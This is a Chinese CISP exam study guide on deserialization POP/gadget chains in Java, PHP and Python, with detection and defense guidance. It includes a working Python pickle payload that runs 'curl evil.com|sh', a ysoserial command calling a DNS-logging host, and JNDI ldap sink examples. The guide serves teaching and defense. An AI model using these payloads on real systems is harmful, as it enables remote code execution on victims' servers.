# 反序列化漏洞链挖掘实战 (POP Chain)

> **📘 文档定位**：CISP 考试代码审计高阶内容 | 难度：⭐⭐⭐⭐⭐ | 预计阅读：25 分钟
> POP Chain 是反序列化漏洞的核心利用技术。本文从 POP 链构造四步法、各语言经典 Gadget 链速查到识别与防御，系统梳理反序列化漏洞攻防体系。

---

## 导航目录
- [一、反序列化漏洞的本质](#一反序列化漏洞的本质)
- [二、主流语言的危险反序列化器](#二主流语言的危险反序列化器)
- [三、POP 链构造的基本思路](#三pop-链构造的基本思路)
- [四、经典链示例 (Java Commons-Collections 6)](#四经典链示例-java-commons-collections-6)
- [五、经典链示例 (PHP Laravel RCE)](#五经典链示例-php-laravel-rce)
- [六、经典链示例 (Python pickle)](#六经典链示例-python-pickle)
- [七、识别与发现](#七识别与发现)
- [八、经典 Gadget 速查表 (Java)](#八经典-gadget-速查表-java)
- [九、防护与修复](#九防护与修复)
- [十、实战演练清单](#十实战演练清单)
- [十一、高分考点与知识巧记](#十一高分考点与知识巧记)

---

## 一、反序列化漏洞的本质

反序列化漏洞的核心在于: **应用把外部不可信数据作为序列化流, 使用不安全的反序列化器进行还原**。还原过程中, 会触发被还原对象的 "魔法方法" (`__construct`, `__destruct`, `__wakeup`, `__toString`, `__get`, `__set`, `__call`, `__invoke`, `readObject`, `finalize`, ...), 攻击者利用这些魔法方法一步步构造"代码执行/文件操作/网络请求"等有害行为。

整条调用链称为 **POP (Property Oriented Programming) Chain 或 Gadget Chain**。

## 二、主流语言的危险反序列化器

| 语言 | 常见漏洞点 | 经典 payload 工具 |
|------|-----------|-----------------|
| **Java** | `ObjectInputStream.readObject` / `SnakeYAML` / `Fastjson` / `Jackson default typing` / `XMLDecoder` / `XStream` / `hessian/Kryo` | ysoserial, marshalsec, JNDI-Injection-Exploit |
| **PHP** | `unserialize()` | phpggc, Burp PHP Deserialization Scanner |
| **Python** | `pickle.loads` / `yaml.load` (非 SafeLoader) / `jsonpickle.decode` / `shelve` / `marshal` | pickle-pwn, manually crafted |
| **.NET** | `BinaryFormatter` / `NetDataContractSerializer` / `SoapFormatter` / `LosFormatter` / `JSON.NET TypeNameHandling` | ysoserial.net, DotNetShock |
| **Ruby** | `Marshal.load` / `YAML.load` / `Oj.load` | universal-ruby-deserialization |
| **Node.js** | `node-serialize` / `node-yaml` 的旧版 `safeLoad` 不安全场景 | 手工构建 |

## 三、POP 链构造的基本思路

```
目标: RCE (远程执行命令) / 文件读写 / SSRF / 权限绕过

Step 1. 寻找"起点 Gadget":
  - Java:  ObjectInputStream.readObject → readObject() / readResolve() / finalize()
  - PHP:   unserialize() → __wakeup() / __destruct() / __toString()
  - Python: pickle → __reduce__() / __reduce_ex__()
  - .NET:  BinaryFormatter → ISerializable / OnDeserialized / Finalize

Step 2. 寻找"中间转发 Gadget":
  把"用户可控属性"传递到"危险方法调用"。
  典型模式:
    - toString()/hashCode()/equals() 被自动调用
    - Map.get(key), key 由用户提供
    - 反射/Method.invoke(), 参数可控
    - 调用某模板引擎 / 表达式引擎执行表达式

Step 3. 寻找"Sink Gadget":
  Runtime.getRuntime().exec(cmd) / ProcessBuilder.start()
  FileOutputStream.write(path, data)  /  JNDI lookup(ldap://evil)

Step 4. 串联整条链:
  [反序列化入口] → G1.method() → G2.method() → ... → Sink (RCE)
         ^
      属性完全由攻击者可控
```

## 四、经典链示例 (Java Commons-Collections 6)

```java
// 触发链 (简化版, 依赖 commons-collections 3.2.1):
//
// ObjectInputStream.readObject()
//   → PriorityQueue.readObject()
//      → heap[i].compareTo(heap[j])  // 内部比较器触发
//         → TransformingComparator.compare(a,b)
//            → ChainedTransformer.transform(a)
//               → [ConstantTransformer, InvokerTransformer, ...]
//                  → Runtime.getRuntime().exec("calc.exe")
//
// ysoserial 生成: java -jar ysoserial.jar CommonsCollections6 "nslookup xxx.ceye.io"
```

## 五、经典链示例 (PHP Laravel RCE)

```php
// phpggc Laravel/RCE4 exec 'id'
// 核心链:
// __destruct() 中调用 pendingValidators
//   → Validator::make()->rules()
//      → call_user_func_array([$class, $method], $args)
//         → system('id')
//
// 思路:
//  1) 找到含 __destruct 且属性可控的类
//  2) 在 __destruct 内追踪到方法调用链, 发现最终调用 call_user_func
//  3) 把参数 (callable, args) 设置为 (system, 'id')
//  4) 把整个对象结构 serialize → base64 → 提交给目标 unserialize
```

## 六、经典链示例 (Python pickle)

```python
import pickle, os, base64

class R(object):
    def __reduce__(self):  # __reduce__ 是 pickle 的 "魔法方法", 返回 (callable, args_tuple)
        return (os.system, ('curl evil.com|sh',))

payload = pickle.dumps(R())
print(base64.b64encode(payload).decode())

# 目标代码:
#   data = request.get_data()
#   obj = pickle.loads(base64.b64decode(data))   # 这里被执行
```

## 七、识别与发现

### 7.1 静态扫描 (代码审计)

```bash
# Java:
grep -rn "new ObjectInputStream\|readObject\|parse(\"[^\"]*\"" src/
grep -rn "JSON.parseObject\|TypeReference\|@class" src/        # fastjson
grep -rn "enableDefaultTyping\|ObjectMapper.readValue" src/    # jackson

# PHP:
grep -rn "unserialize(" src/
grep -rn "unserialize(\s*\$_" src/       # 直接接收 GET/POST/COOKIE

# Python:
grep -rn "pickle.loads\|pickle.load" src/
grep -rn "yaml.load(" src/              # 检查是否使用了非 SafeLoader
grep -rn "jsonpickle.decode" src/

# .NET:
grep -rln "BinaryFormatter\|NetDataContractSerializer\|LosFormatter" src/
```

### 7.2 动态探测 (黑盒)

```
1) 寻找可疑参数名:
   ?data=YToxOntzOj... (base64)
   Cookie "session" / "userData" 长字符串
   请求体 "viewstate" / "session" / "state"

2) 尝试提交:
   - 破坏 payload 结构 (截断 / 位翻转), 观察是否报错
   - 提交空字符串 / 短字符串, 观察反序列化失败日志
   - 提交知名 payload (如 ysoserial CommonsCollections DNS 探测 payload)

3) DNSLog/OOB 验证:
   Burp Collaborator / ceye.io / dnslog.cn
   用 DNS 带出目标主机信息 / 确认 payload 触发

4) 使用 Burp 插件:
   - Java Deserialization Scanner
   - ysoserial integration
   - SuperSerial
```

## 八、经典 Gadget 速查表 (Java)

| 链 | 依赖 | 适用场景 | 说明 |
|----|------|---------|------|
| **CC1/CC3/CC6/CC7** | commons-collections 3.x | JDK ≤ 8u71 | 最经典 |
| **CommonsBeanutils1** | commons-beanutils 1.9.2 | JDK 高版本也可用 | 无版本上限, 实战首选 |
| **Jdk7u21** | 无第三方依赖, 纯 JDK 7u21 | JRE = 7u21 | 对类路径无要求 |
| **Groovy1** | groovy | Spring / Groovy 项目 | `groovy.lang.GroovyShell` |
| **Spring1/Spring2** | spring-core + spring-beans | Spring 项目 | `JdbcTemplate` / `MethodInvokingFactoryBean` |
| **FileUpload1** | commons-fileupload | 写文件 | 写 shell / 覆盖配置 |
| **BeanShell1** | bsh-2.0b4 | 老项目 | `bsh.Interpreter.eval` |
| **C3P0** | c3p0 | 数据库连接池 | JNDI 注入 / 加载远程 XML |
| **ROME** | rome | ROME 版本漏洞 | `ToStringBean` 触发 |
| **Fastjson** | fastjson 1.2.24-1.2.68 | 直接 `JSON.parseObject(json)` | `autoType` 模式 + 恶意 `@class` |
| **Jackson** | jackson-databind 2.x + `enableDefaultTyping` | Spring 后端 | `@class` 反序列化 |
| **SnakeYAML** | snakeyaml ≤ 2.0 | Spring / 配置解析 | `!!javax.script.ScriptEngineManager` |

## 九、防护与修复

| 策略 | 说明 |
|------|------|
| **禁用不安全的反序列化器** | Java 下黑名单 `ObjectInputStream.readObject`; Python 下禁止 `pickle.loads(外部数据)`; .NET 下禁止 `BinaryFormatter` |
| **白名单类校验** | Java 自定义 `ObjectInputStream` 覆盖 `resolveClass`; Jackson 设置 `activateDefaultTyping` 仅允许受信包 |
| **不接收外部序列化流** | 仅在"同一进程内缓存+读取"场景使用; 对跨进程/跨机器传输, 改用 JSON / Protobuf (纯数据, 不包含类信息) |
| **升级依赖库** | fastjson 1.2.83+, jackson-databind 最新版, commons-beanutils 1.9.4+, snakeyaml 2.x+ |
| **最小权限原则** | JVM 进程 / Python 进程 / 应用池账号都应被限制, 即便被 RCE, 无法破坏系统核心 |
| **RASP / APM 运行时防护** | Java 下: OpenRASP / 阿里云 RASP / Contrast Security; 拦截危险调用 (Runtime.exec, JNDI lookup, Class.forName 远程类) |
| **依赖扫描** | 持续集成中运行 ysoserial 生成的 OOB payload 做回归测试 / semgrep 检测危险函数 |
| **业务上的"延迟执行"防护** | 反序列化后立即调用 `Runtime.getRuntime().exec`, `new URL(url).getContent`, `FileOutputStream` 等操作需告警 + 白名单 |

## 十、实战演练清单

- [ ] 代码库全局 grep "unserialize / readObject / pickle.loads / BinaryFormatter / TypeNameHandling" 并逐一审查
- [ ] 构建 CI 脚本, 禁止新增此类调用 (lint / custom rule / semgrep 自定义规则)
- [ ] 升级 fastjson / jackson / snakeyaml / commons-beanutils 等已知风险依赖
- [ ] 对 Fastjson 强制关闭 autoType, 或在 `addAccept` 中仅允许受信包前缀
- [ ] Java 应用启用 JEP 290 (Serialization Filter) 白名单
- [ ] 业务会话/状态存储, 仅允许 JSON / MsgPack, 禁止原生序列化
- [ ] 部署 RASP, 监控 Runtime.exec / JNDI / ProcessBuilder 等关键调用
- [ ] 每季度做一次反序列化专项渗透测试 (结合 ysoserial / phpgcc / 手工构造)
- [ ] 建立"疑似反序列化"告警 → 安全团队 24h 响应流程
- [ ] 团队培训: 反序列化危害 + 正确替代方案 (JSON/Proto/Thrift)

---

## 十一、高分考点与知识巧记

> 🔑 **高分考点**：POP Chain 是反序列化漏洞的理论核心，考试侧重理解 Gadget 链构造原理和各语言经典链。CC 链、Fastjson、Laravel RCE 是三大高频考点。

| 考点 | 频次 | 核心记忆点 |
|:---|:---:|:---|
| POP Chain 四步法 | ⭐⭐⭐⭐⭐ | 起点(魔法方法) → 中间(属性传递) → 终点(危险操作) → 串联 |
| Java CC 链 | ⭐⭐⭐⭐⭐ | CommonsCollections 1-7，ysoserial 生成 |
| PHP unserialize | ⭐⭐⭐⭐ | __wakeup/__destruct 入口，phpggc 工具 |
| Python pickle | ⭐⭐⭐⭐ | __reduce__ 返回(callable, args)，直接 RCE |
| 防护方案 | ⭐⭐⭐⭐ | 禁不安全反序列化器 > 白名单类 > JSON/Proto 替代 |

> 💡 **知识巧记**：POP 链构造记"起中转串"——起点(魔法方法入口)、中间(属性传递转发)、终点(Sink 危险操作)、串联(属性全可控)。各语言工具对照：Java→ysoserial、PHP→phpggc、.NET→ysoserial.net、Python→手工 __reduce__。防护优先级：禁用 > 白名单 > 替代格式 > 升级依赖 > RASP。

### 高分考点速查表

| 考察维度 | 关键结论 | 常见干扰项 |
|:---|:---|:---|
| CC 链核心 | PriorityQueue.readObject → compareTo → ChainedTransformer → Runtime.exec | "CC 链只在 JDK 8 有效" ❌ |
| Fastjson | autoType 模式 + @type 指定 class = RCE | "Fastjson 最新版仍有反序列化漏洞" ❌ |
| pickle vs json | pickle 可执行代码，json 纯数据安全 | "pickle 和 json 安全性相同" ❌ |
| JEP 290 | Java 序列化过滤器，白名单类校验 | "JEP 290 完全解决反序列化问题" ❌ |
| 替代方案 | JSON/Protobuf/Thrift 不含类信息 | "XML 也是安全的替代格式" ❌ |

### 知识巧记口诀

> **POP Chain 攻防口诀**：
> 反序列化核心起中转串，魔法方法入口起。
> Java ysoserial CC 链，PHP phpggc Laravel 袭。
> Python __reduce__ 直捣黄龙，.NET ysoserial.net BinaryFormatter 忌。
> 防护禁用不安全器，白名单类 JSON Proto 替。
> RASP 监控 Runtime.exec，JNDI lookup 拦截齐。
